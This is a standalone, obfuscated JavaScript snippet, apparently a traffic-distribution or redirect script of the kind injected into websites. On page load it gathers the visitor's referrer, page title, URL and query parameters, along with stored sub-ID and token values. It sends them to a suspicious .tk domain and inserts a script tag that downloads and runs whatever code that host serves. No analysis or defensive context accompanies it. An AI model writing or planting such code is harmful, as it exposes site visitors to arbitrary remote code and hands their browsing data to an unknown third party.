(function() {
    var name = '_jQ5gJ6q7w1ZnKGxB';
    if (!window._jQ5gJ6q7w1ZnKGxB) {
        window._jQ5gJ6q7w1ZnKGxB = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://paygambfasliling.tk/Vm3YKjSB',
            P_PATH: 'https://paygambfasliling.tk/fec84ce/postback',
        };
    }
    const _gTRCbMGNZrNWyHqj = localStorage.getItem('config');
    if (typeof _gTRCbMGNZrNWyHqj !== 'undefined' && _gTRCbMGNZrNWyHqj !== null) {
        var _ccNYqbzmpdDXjXmP = JSON.parse(_gTRCbMGNZrNWyHqj);
        var _dLjv1Xwz8SXn6DgL = Math.round(+new Date()/1000);
        if (_ccNYqbzmpdDXjXmP.created_at + window._jQ5gJ6q7w1ZnKGxB.ttl < _dLjv1Xwz8SXn6DgL) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _6d1Jkykn7bjWcfYh = localStorage.getItem('subId');
    var _ggCPHgmN2qCYdJXx = localStorage.getItem('token');
    var _tr8tcTcYwCj77gbb = '?return=js.client';
        _tr8tcTcYwCj77gbb += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _tr8tcTcYwCj77gbb += '&se_referrer=' + encodeURIComponent(document.referrer);
        _tr8tcTcYwCj77gbb += '&default_keyword=' + encodeURIComponent(document.title);
        _tr8tcTcYwCj77gbb += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _tr8tcTcYwCj77gbb += '&name=' + encodeURIComponent(name);
        _tr8tcTcYwCj77gbb += '&host=' + encodeURIComponent(window._jQ5gJ6q7w1ZnKGxB.R_PATH);
    if (typeof _6d1Jkykn7bjWcfYh !== 'undefined' && _6d1Jkykn7bjWcfYh && window._jQ5gJ6q7w1ZnKGxB.unique) {
        _tr8tcTcYwCj77gbb += '&sub_id=' + encodeURIComponent(_6d1Jkykn7bjWcfYh);
    }
    if (typeof _ggCPHgmN2qCYdJXx !== 'undefined' && _ggCPHgmN2qCYdJXx && window._jQ5gJ6q7w1ZnKGxB.unique) {
        _tr8tcTcYwCj77gbb += '&token=' + encodeURIComponent(_ggCPHgmN2qCYdJXx);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._jQ5gJ6q7w1ZnKGxB.R_PATH + _tr8tcTcYwCj77gbb;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
